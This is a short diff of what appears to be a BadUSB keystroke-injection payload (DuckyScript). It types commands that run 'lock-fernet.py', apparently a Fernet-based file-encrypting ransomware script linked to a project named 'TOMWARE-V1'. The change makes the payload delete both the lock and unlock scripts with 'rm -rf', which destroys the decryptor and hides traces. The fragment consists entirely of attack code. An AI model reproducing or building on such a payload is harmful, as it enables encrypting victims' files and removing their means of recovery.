@@ -14,10 +14,10 @@ DELAY 700
 STRING python3 lock-fernet.py
 ENTER
 DELAY 700
-STRING cd
+STRING rm -rf lock-fernet.py
 ENTER
 DELAY 700
-STRING rm -rf TOMWARE-V1
+STRING rm -rf unlock-fernet.py
 ENTER
 DELAY 700
 STRING cd
